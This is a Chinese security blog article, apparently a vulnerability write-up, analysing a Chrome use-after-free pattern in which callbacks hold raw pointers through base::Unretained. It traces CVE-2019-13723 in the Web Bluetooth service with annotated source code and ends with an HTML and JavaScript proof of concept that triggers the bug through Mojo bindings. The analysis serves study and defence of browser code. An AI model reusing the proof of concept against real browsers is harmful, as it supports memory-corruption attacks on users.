# Chrome UAF漏洞模式浅析（二）：callback storing raw pointer

阅读量 **198840**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-02 14:30:41

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01f3390ae30c31598a.jpg)

## 前序

本篇和上一篇有所类似，但是本篇主要用到的特性偏重于对象ownership关系的误用，以及callback里指针的不安全用法。  
基础知识里主要需要了解chromium里callback的一些用法，参考[官方文档](https://chromium.googlesource.com/chromium/src.git/+/master/docs/callback.md)，这里我仅仅摘录一些必要了解的知识。

## 前置基础: callback

###  Introduction

`base::Callback<>`类模板和定义在`base/bind.h`里的`base::Bind()`函数提供了一种用于执行partial
application of functions类型安全的方法。

Partial
application是将函数参数的子集进行bind以产生另一个需要较少参数的函数的过程，这可以用来延迟执行的单位，就像其他语言中使用的词法闭包一样，它用来在Chromium中调度不同MessageLoops上的任务。

没有 **未绑定** 的输入参数的回调称为`base::Closure`，请注意这与其他语言的闭包不同，它不保留对其封闭环境的引用。

###  OnceCallback<>和RepeatingCallback<>

`base::OnceCallback<>`和`base::RepeatingCallback<>`是下一代回调类。

`base::OnceCallback<>`由`base::BindOnce()`创建，这是move-only类型的回调变体，仅可运行一次。默认情况下，这会让绑定参数从其内部存储，move到绑定函数，因此，moveable类型更易于使用，这应该是首选的回调类型:
**由于回调的生命周期很明确，因此很容易推断，回调在线程之间传递的时候，是什么时候被销毁**

`base::RepeatingCallback<>`由`base::BindRepeating()`创建，这是一个可复制的回调变体，可以多次运行，它内部使用引用计数来减少副本带来的性能代价，但是由于所有权是共享的，所以很难推断何时回调和BoundState被破坏，尤其是在线程之间传递回调的时候。

旧版`base::Callback<>`当前别名为`base::RepeatingCallback<>`

###  Quick reference for basic stuff

####  Binding A Bare Function

    
    
    int Return5() { return 5; }
    base::OnceCallback<int()> func_cb = base::BindOnce(&Return5);
    LOG(INFO) << std::move(func_cb).Run();  // Prints 5.
    
    
    
    int Return5() { return 5; }
    base::RepeatingCallback<int()> func_cb = base::BindRepeating(&Return5);
    LOG(INFO) << func_cb.Run();  // Prints 5.
    

###  Quick reference for binding parameters to Bind()

Bound
parameters作为`base::Bind()`的参数被指定，并且被传递给function，举例来说，在回调foo函数调用的时候，Bind的第二个参数`base::Owned(pn)`就被传递给foo，作为其参数arg使用。

    
    
    void foo(int* arg) { cout << *arg << endl; }
    base::Bind(&foo, base::Owned(pn));
    

没有参数，或者 **没有未绑定参数的回调** 称为base::Closure，即 **闭包** ，其就代表`base::Callback<void()>`

####  Passing Parameters Owned By The Callback

    
    
    void Foo(int* arg) { cout << *arg << endl; }
    int* pn = new int(1);
    base::Closure foo_callback = base::Bind(&foo, base::Owned(pn));
    

**即使未运行回调，该参数也会在回调被destroy后被delete。**

## 漏洞模式

Chrome里的callback通常通过`base::BindOnce`或者`base::BindRepeating`创建，当callback被创建的时候，参数被[bound](https://chromium.googlesource.com/chromium/src.git/+/master/docs/callback.md#Passing-Bound-Input-Parameters)到callback上。不同类型的bind指定如何管理bind state。  
这其中最危险的一种是[base::Unretained](https://chromium.googlesource.com/chromium/src.git/+/master/docs/callback.md#binding-a-class-method-with-manual-lifetime-management)

    
    
    base::Bind(&MyClass::Foo, base::Unretained(ptr));
    

这代表callback对象不own
ptr，由callback的调用者来保证当callback被执行的时候，ptr还存在。虽然很危险，但这是一个众所周知的问题，开发人员通常会意识到后果，Unretained的许多用法都有说明其用法合理的注释。

###  漏洞分析: CVE-2019-13723

<https://bugs.chromium.org/p/chromium/issues/detail?id=1024121>

####  root cause

    
    
    void WebBluetoothServiceImpl::RequestDevice(
        blink::mojom::WebBluetoothRequestDeviceOptionsPtr options,
        RequestDeviceCallback callback) {
      RecordRequestDeviceOptions(options);
    
      if (!GetAdapter()) {
        if (BluetoothAdapterFactoryWrapper::Get().IsLowEnergySupported()) {
          BluetoothAdapterFactoryWrapper::Get().AcquireAdapter(                        
              this, base::BindOnce(&WebBluetoothServiceImpl::RequestDeviceImpl,//[0]
                                   weak_ptr_factory_.GetWeakPtr(),
                                   std::move(options), std::move(callback)));
          return;
        }
        RecordRequestDeviceOutcome(
            UMARequestDeviceOutcome::BLUETOOTH_LOW_ENERGY_NOT_AVAILABLE);
        std::move(callback).Run(
            blink::mojom::WebBluetoothResult::BLUETOOTH_LOW_ENERGY_NOT_AVAILABLE,
            nullptr /* device */);
        return;
      }
      RequestDeviceImpl(std::move(options), std::move(callback), GetAdapter());    
    }
    
    
    
    void BluetoothAdapterFactoryWrapper::AcquireAdapter(
        BluetoothAdapter::Observer* observer,
        AcquireAdapterCallback callback) {
      DCHECK(thread_checker_.CalledOnValidThread());
      DCHECK(!GetAdapter(observer));
    
      AddAdapterObserver(observer);
      if (adapter_.get()) {
        base::ThreadTaskRunnerHandle::Get()->PostTask(
            FROM_HERE,
            base::BindOnce(std::move(callback), base::Unretained(adapter_.get())));//[1]
        return;
      }
    
      DCHECK(BluetoothAdapterFactory::Get().IsLowEnergySupported());
      BluetoothAdapterFactory::GetAdapter(
          base::BindOnce(&BluetoothAdapterFactoryWrapper::OnGetAdapter,
                         weak_ptr_factory_.GetWeakPtr(), std::move(callback)));
    }
    
    
    
    void WebBluetoothServiceImpl::DidFinishNavigation
       ===>
            void WebBluetoothServiceImpl::ClearState() {
              .....
              BluetoothAdapterFactoryWrapper::Get().ReleaseAdapter(this);
            }
            ===> 
                void BluetoothAdapterFactoryWrapper::ReleaseAdapter(
                    BluetoothAdapter::Observer* observer) {
                  DCHECK(thread_checker_.CalledOnValidThread());
                  if (!HasAdapter(observer)) {
                    return;
                  }
                  RemoveAdapterObserver(observer);
                  if (adapter_observers_.empty())
                    set_adapter(scoped_refptr<BluetoothAdapter>());//[2]
                }
    
    
    
    void WebBluetoothServiceImpl::RequestDeviceImpl
    {
        ...
        device_chooser_controller_.reset();
        device_chooser_controller_.reset(
            new BluetoothDeviceChooserController(this, render_frame_host_, adapter));//[3]
        ...
        device_chooser_controller_->GetDevice(
          std::move(options),
          base::Bind(&WebBluetoothServiceImpl::OnGetDeviceSuccess,
                     weak_ptr_factory_.GetWeakPtr(), copyable_callback),
          base::Bind(&WebBluetoothServiceImpl::OnGetDeviceFailed,
                     weak_ptr_factory_.GetWeakPtr(), copyable_callback))
    }
    
    
    
    void BluetoothDeviceChooserController::GetDevice
    {
        ...
        if (!adapter_->IsPresent()) {//[4]
        DVLOG(1) << "Bluetooth Adapter not present. Can't serve requestDevice.";
        RecordRequestDeviceOutcome(
            UMARequestDeviceOutcome::BLUETOOTH_ADAPTER_NOT_PRESENT);
        PostErrorCallback(WebBluetoothResult::NO_BLUETOOTH_ADAPTER);
        return;
      }
    }
    

  * [0] 这里将RequestDeviceImpl和它的参数this(以weak_ptr的形式引用，见上文前置知识),options,callback打包成一个callback传给AcquireAdapter，从而被异步调用。 
    
        base::BindOnce(&WebBluetoothServiceImpl::RequestDeviceImpl,
                                 weak_ptr_factory_.GetWeakPtr(),
                                 std::move(options), std::move(callback)
    

  * [1] `BluetoothAdapterFactoryWrapper::Get`是一个static函数，它的作用就是拿到一个全局唯一的BluetoothAdapterFactoryWrapper类型的单例对象，并调用其AcquireAdapter方法，这个方法的作用是:如果单例对象的`adapter_`不为空，就先通过`base::ThreadTaskRunnerHandle::Get()`拿到当前线程的taskrunner(这里应该是`Browser::UI`线程），并将在`[0]`里打包好的callback作为任务，`adapter_.get()`里保存的原始指针作为任务的参数，发布到当前线程的taskrunner里，等待message loop取出任务并执行。 **但因为adapter_.get()是Unretained装饰的，其并不被任务own，也就是说即使这个指针指向的对象被析构，变成了一个野指针，这个任务也会执行，所以就有UAF的可能，我们需要找一下在哪里能析构掉它**
  * [2] **WebBluetoothServiceImpl继承自WebContentsObserver** ,所以当一个WebBluetoothServiceImpl被构造，它就会被加到它关联的那个WebContentsImpl的`observers_`观察者队列里，当页面被刷新的时候，`WebContentsImpl::DidFinishNavigation`将遍历它所有的观察者，并调用其`observer->DidFinishNavigation`方法，这个方法最终将释放掉adapter对象。 
    
        void WebContentsImpl::DidFinishNavigation(NavigationHandle* navigation_handle) {
    TRACE_EVENT1("navigation", "WebContentsImpl::DidFinishNavigation",
                 "navigation_handle", navigation_handle);
    
    observers_.ForEachObserver([&](WebContentsObserver* observer) {
      observer->DidFinishNavigation(navigation_handle);
    });
    

  * [3] **当adapter被释放之后** ，若任务队列里还有在`[0]`里被打包好的`WebBluetoothServiceImpl::RequestDeviceImpl`没有执行，当其执行的时候，就会将adapter原始指针传递给BluetoothDeviceChooserController,即此时`device_chooser_controller_`持有的是一个已经被析构了的adapter对象。
  * [4] 当`device_chooser_controller_`在这个被析构了的adapter对象上调用IsPresent方法，就会触发一个UAF。

####  poc

    
    
    <html>
    <head>
    <script src="mojo_bindings.js"></script>
    <script src="third_party/blink/public/mojom/bluetooth/web_bluetooth.mojom.js"></script>
    
    <script>
    var x = 0;
    var ptr;
    var option;
    ptr = new blink.mojom.WebBluetoothServicePtr();
    Mojo.bindInterface(blink.mojom.WebBluetoothService.name, mojo.makeRequest(ptr).handle, "context", true);
    
    function tigger(){
            console.log("tigger()");
            ptr = new blink.mojom.WebBluetoothServicePtr();
            Mojo.bindInterface(blink.mojom.WebBluetoothService.name, mojo.makeRequest(ptr).handle, "context", true);
            option = new Array();
        option.acceptAllDevices = true;
        option.optionalServices = new Array();
        option.optionalServices.uuid = "11111111";
        ptr.requestDevice(option);
    
    }
    
    document.addEventListener("DOMContentLoaded", () => { 
    for(var i = 0; i < 100; i++) { 
        tigger();
    } 
        document.location.reload(); 
    }); 
    
    </script>
    </head>
    <body>
    </body>
    </html>
    

## 后记

本篇提到的callback里不规范的指针用法已经鲜有表层漏洞，但是结合一些其他的点，串起来，仍旧可以旧瓶装新酒，读者可以多多思考。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **sakura** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/231412](/post/id/231412)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [漏洞挖掘](/tag/漏洞挖掘)
  * [Chrome](/tag/Chrome)
  * [双倍活动](/tag/双倍活动)

 **+1** __3赞

 __收藏

![](https://thirdqq.qlogo.cn/qqapp/101430193/44110799D419F015C1D87EF97B55B122/40)
sakura

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

